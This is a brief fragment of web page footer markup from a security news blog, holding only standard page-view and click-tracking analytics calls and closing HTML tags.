	_stq.push([ 'view', {v:'ext',j:'1:9.5.2',blog:'166161023',post:'72266',tz:'-4',srv:'news.sophos.com'} ]);
	_stq.push([ 'clickTrackerInit', '166161023', '72266' ]);
</script>
</body>
</html>
